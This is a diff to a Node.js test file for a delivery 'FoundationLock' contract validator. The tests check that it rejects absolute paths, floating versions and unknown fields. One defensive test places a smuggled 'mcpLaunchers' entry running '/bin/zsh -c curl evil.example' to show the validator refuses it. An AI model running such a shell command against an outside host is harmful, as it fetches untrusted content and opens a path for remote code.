@@ -1,6 +1,9 @@
 import assert from 'node:assert/strict';
 import crypto from 'node:crypto';
+import fs from 'node:fs';
+import path from 'node:path';
 import test from 'node:test';
+import { fileURLToPath } from 'node:url';
 import { CONTRACTS, parseContract } from '../contracts/delivery/index.js';
 import {
   parseTapSummary,
@@ -37,6 +40,22 @@ function foundationLockFixture() {
     },
     profile: 'managed-pilot',
   };
+}
+
+const testDir = path.dirname(fileURLToPath(import.meta.url));
+
+function foundationLockWithExtensionsFixture() {
+  const payload = foundationLockFixture();
+  payload.mcps = [
+    { name: 'chrome-devtools', version: '1.2.3', digest: sha('mcp/chrome-devtools') },
+    { name: 'github', digest: sha('mcp/github') },
+  ];
+  payload.methodProfile = {
+    path: 'openspec/changes/delivery-foundation-rearchitecture/method-profile-manifest.json',
+    digest: sha('method-profile'),
+    profile: 'comet-classic',
+  };
+  return payload;
 }
 
 function baselineRefFixture() {
@@ -318,6 +337,65 @@ const TAP_BEHAVIOR_RED = [
   '# skipped 0',
   '',
 ].join('\n');
+
+test('FoundationLock models the exporter artifact: mcps and methodProfile payloads pass', () => {
+  const parsed = parseContract('SDD.Delivery.FoundationLock', foundationLockWithExtensionsFixture());
+  assert.equal(parsed.ok, true, parsed.errors?.join('; ') ?? '');
+});
+
+test('FoundationLock v1 accepts the real exported foundation lock artifact', () => {
+  const artifactPath = path.resolve(testDir, '../foundation/foundation-lock.json');
+  const artifact = JSON.parse(fs.readFileSync(artifactPath, 'utf8'));
+  const parsed = parseContract('SDD.Delivery.FoundationLock', artifact);
+  assert.equal(parsed.ok, true, parsed.errors?.join('; ') ?? '');
+});
+
+test('FoundationLock rejects machine absolute paths in version and path fields (ABSOLUTE_PATH_FORBIDDEN)', () => {
+  const inVersion = foundationLockFixture();
+  inVersion.toolchain.cli.version = '/Users/mac/bin/node';
+  assert.match(parseContract('SDD.Delivery.FoundationLock', inVersion).errors.join('\n'), /ABSOLUTE_PATH_FORBIDDEN/);
+
+  const inSchemaRef = foundationLockFixture();
+  inSchemaRef.policy.schemaRef = '/Users/mac/repo/hooks.yaml';
+  assert.match(parseContract('SDD.Delivery.FoundationLock', inSchemaRef).errors.join('\n'), /ABSOLUTE_PATH_FORBIDDEN/);
+
+  const inProfilePath = foundationLockWithExtensionsFixture();
+  inProfilePath.methodProfile.path = '/Users/mac/repo/method-profile-manifest.json';
+  assert.match(parseContract('SDD.Delivery.FoundationLock', inProfilePath).errors.join('\n'), /ABSOLUTE_PATH_FORBIDDEN/);
+});
+
+test('FoundationLock rejects floating versions (latest/HEAD/@latest/unpinned ranges) in version fields', () => {
+  for (const floating of ['@latest', 'HEAD', 'latest', '1.x', '^1.2.3']) {
+    const payload = foundationLockFixture();
+    payload.toolchain.runner.version = floating;
+    const parsed = parseContract('SDD.Delivery.FoundationLock', payload);
+    assert.equal(parsed.ok, false, `runner.version=${floating} must be refused`);
+    assert.match(parsed.errors.join('\n'), /floating versions are forbidden/);
+  }
+
+  const mcpFloating = foundationLockFixture();
+  mcpFloating.mcps = [{ name: 'llmwiki', version: 'latest', digest: sha('mcp/llmwiki') }];
+  assert.match(parseContract('SDD.Delivery.FoundationLock', mcpFloating).errors.join('\n'), /floating versions are forbidden/);
+
+  const pinned = foundationLockFixture();
+  pinned.toolchain.node = '24.15.0';
+  pinned.toolchain.cli.version = '0.2.4';
+  assert.equal(parseContract('SDD.Delivery.FoundationLock', pinned).ok, true, 'pinned releases must keep passing');
+});
+
+test('FoundationLock v1 has a closed top-level field set; BaselineRef keeps the additive evolution path', () => {
+  const smuggled = foundationLockFixture();
+  smuggled.mcpLaunchers = [{ command: '/bin/zsh', args: ['-c', 'curl evil.example'] }];
+  const parsed = parseContract('SDD.Delivery.FoundationLock', smuggled);
+  assert.equal(parsed.ok, false, 'unmodeled launch data must not ride on the lock');
+  assert.match(parsed.errors.join('\n'), /mcpLaunchers: unknown field/);
+  assert.match(parsed.errors.join('\n'), /closed field set/);
+
+  const evolving = baselineRefFixture();
+  evolving.futureAnnotation = 'reserved-for-additive-v1-evolution';
+  assert.equal(parseContract('SDD.Delivery.BaselineRef', evolving).ok, true,
+    'contracts without a closed field set keep the extra-field evolution path');
+});
 
 test('parseTapSummary reads the top-level TAP summary and rejects output without one', () => {
   const summary = parseTapSummary(TAP_BEHAVIOR_RED);
